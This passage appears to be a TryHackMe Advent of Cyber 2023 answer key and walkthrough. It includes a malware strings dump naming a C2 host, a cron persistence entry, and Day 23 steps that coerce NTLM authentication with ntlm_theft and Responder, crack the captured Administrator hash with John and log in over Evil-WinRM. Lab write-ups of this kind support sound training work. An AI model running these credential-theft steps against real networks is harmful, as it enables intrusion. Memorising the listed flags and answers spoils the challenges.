    1111 using unaddressable value1455191522836685180664062572759576141834259033203125: day-of-year out of rangeECDSA verification failureGODEBUG: can not disable "HTTP Version Not SupportedSIGSTOP: stop, unblockableaddress type not supportedasn1: invalid UTF-8 stringbad certificate hash valuebase 128 integer too largebidirule: failed Bidi Rulecall from unknown functioncannot marshal DNS messagechacha20: counter overflowchacha20: wrong nonce sizecorrupted semaphore ticketcriterion lacks equal signcryptobyte: internal errorduplicate pseudo-header %qencountered a cycle via %sentersyscall inconsistent forEachP: P did not run fnfreedefer with d.fn != nilhttp2: Framer %p: wrote %vid (%v) <= evictCount (%v)initSpan: unaligned lengthinvalid port %q after hostinvalid request descriptormalformed HTTP status codemalformed chunked encodingname not unique on networknet/http: request canceledno CSI structure availableno message of desired typenon sequence tagged as setnonvoluntary_ctxt_switchesnotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0read from empty dataBufferreadLoopPeekFailLocked: %vreflect.Value.CanInterfacereflect.Value.OverflowUintrequired key not availableruntime: bad span s.state=runtime: pipe failed with segment prefix is reservedshrinking stack in libcallstartlockedm: locked to mestopped after 10 redirectstoo many colons in addresstruncated base 128 integerunclosed criterion bracket is not assignable to type !#$%&()*+-./:<=>?@[]^_{|}~ .*keywords" CONTENT="(.*)">363797880709171295166015625Common 32-bit KVM processorCurveP256CurveP384CurveP521DATA frame with stream ID 0G waiting list is corruptedSIGILL: illegal instructionSIGXCPU: cpu limit exceededaccess-control-allow-originaddress not a stack addressafter object key:value pairarchive/tar: write too longcan't create process %s: %schannel number out of rangecipher: incorrect length IVcommunication error on sendcryptobyte: length overflowcurrent time %s is after %sgcstopm: not waiting for gcgrowslice: cap out of rangehkdf: entropy limit reachedhttp chunk length too largehttp2: response body closedhttp://mcgreedysecretc2.thminsufficient security levelinternal lockOSThread errorinvalid HTTP header name %qinvalid dependent stream IDinvalid profile bucket typekey was rejected by servicemakechan: size out of rangemakeslice: cap out of rangemakeslice: len out of rangemspan.sweep: bad span statenet/http: invalid method %qnet/http: use last responsenot a XENIX named type fileos: process not initializedos: unsupported signal typeprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: corrupted polldescruntime: netpollinit failedruntime: thread ID overflowruntime
    ```
+ After reading the elfie file, what location is the mysqlserver process dropped in on the file system? `/var/tmp/.system-python3.8-Updates/mysqlserver`
    ```bash
    ubuntu@volatility:~/Desktop/Evidence/extracted$ cat elfie
    # DO NOT EDIT THIS FILE - edit the master and reinstall.
    # (- installed on Mon Oct  2 18:22:12 2023)
    # (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
    */8 * * * * /var/tmp/.system-python3.8-Updates/mysqlserver
    ```
+ If you enjoyed this task, feel free to check out the Volatility room.`No Answer Needed`


# Task 26  [Day 20] DevSecOps Advent of Frostlings
+ What is the handle of the developer responsible for the merge changes?`BadSecOps`
+ What port is the defaced calendar site server running on?`9081`
+ What server is the malicious server running on?`Apache`
+ What message did the Frostlings leave on the defaced site?`Frostlings rule`
+ What is the commit ID of the original code for the Advent Calendar site?`986b7407`
+ If you enjoyed today's challenge, please check out the Source Code Security room.`No Answer Needed`
+ Detective Frosteau believes it was an account takeover based on the activity. However, Tracy might have left some crumbs.`No Answer Needed`

# Task 27  [Day 21] DevSecOps Yule be Poisoned: A Pipeline of Insecure Code!
+ What Linux kernel version is the Jenkins node? `15.4.0-1029-aws`
+ What value is found from /var/lib/jenkins/secret.key `190e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7`

# Task 28  [Day 22] SSRF Jingle Your SSRF Bells: A Merry Command & Control Hackventure
+ Is SSRF the process in which the attacker tricks the server into loading only external resources (yea/nay)? `nay`
+ What is the C2 version? `1.1`
+ What is the username for accessing the C2 panel?`mcgreedy`
+ What is the flag value after accessing the C2 panel?`THM{EXPLOITED_31001}`
+ What is the flag value after stopping the data exfiltration from the McSkidy computer? `THM{AGENT_REMOVED_1001}`
+ If you enjoyed this task, feel free to check out the SSRF room.`No Answer Needed`

# Task 29  [Day 23] Coerced Authentication Relay All the Way
+ What is the name of the AD authentication protocol that makes use of tickets?`Kerberos`
+ What is the name of the AD authentication protocol that makes use of the NTLM hash?`NetNTLM`
+ What is the name of the tool that can intercept these authentication challenges?`responder`
+ What is the password that McGreedy set for the Administrator account?`GreedyGrabber1@`
+ What is the value of the flag that is placed on the Administrator’s desktop?`THM{Greedy.Greedy.McNot.So.Great.Stealy}`
+ If you enjoyed this task, feel free to check out the Compromising Active Directory module!`No Answer Needed`


    ```bash 
    python3 ntlm_theft.py -g lnk -s 10.10.116.194 -f stealthy
    smbclient //10.10.235.49/ElfShare/ -U guest%
    ```
    ```bash
    root@ip-10-10-116-194:~#responder -I ens5
    [SMB] NTLMv2-SSP Client   : ::ffff:10.10.67.236
    [SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
    [SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:a51194937f9842fa:F9B3E2CC6C1F91D69C243C2C16B00543:0101000000000000805BCD0C0537DA015AD3409B4367D2410000000002000800390049005400580001001E00570049004E002D0036004C0035005400420032004C004E0048004700320004003400570049004E002D0036004C0035005400420032004C004E004800470032002E0039004900540058002E004C004F00430041004C000300140039004900540058002E004C004F00430041004C000500140039004900540058002E004C004F00430041004C0007000800805BCD0C0537DA0106000400020000000800300030000000000000000000000000300000540F49087EF9C5960BE6F11D772B9333BEAED2156CB44335D0781FB8E168DA570A001000000000000000000000000000000000000900240063006900660073002F00310030002E00310030002E003100310036002E003100390034000000000000000000

    root@ip-10-10-116-194:~/Rooms/AoC2023/Day23/ntlm_theft/stealthy# john -w=greedykeys.txt hash.txt 
    Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
    Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    GreedyGrabber1@  (Administrator)
    1g 0:00:00:00 DONE (2023-12-25 07:40) 50.00g/s 13150p/s 13150c/s 13150C/s Spring2017..starwars
    Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed. 

    *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
    THM{Greedy.Greedy.McNot.So.Great.Stealy}
    ```

# Task 30  [Day 24] Mobile analysis You Are on the Naughty List, McGreedy
+ One of the photos contains a flag. What is it? `THM{DIGITAL_FORENSICS}`
+ What name does Tracy use to save Detective Frost-eau’s phone number?`Detective Carrot-Nose`
+ One SMS exchanged with Van Sprinkles contains a password. What is it?`chee7AQu`
+ If you have enjoyed this room please check out the Autopsy room.`No Answer Needed`

# Task 31  [Day 24] The Confrontation Jolly Judgment Day
What is the final flag? `THM{YouMeddlingKids}`

# Task 32  [Day 24] The End We the Kings of Cyber Are `No Answer Needed`

# Task 33  [Day 24] Feedback We wish you a Merry Survey
+ What flag did you get after completing the survey?`THM{SurveyComplete_and_HolidaysSaved}`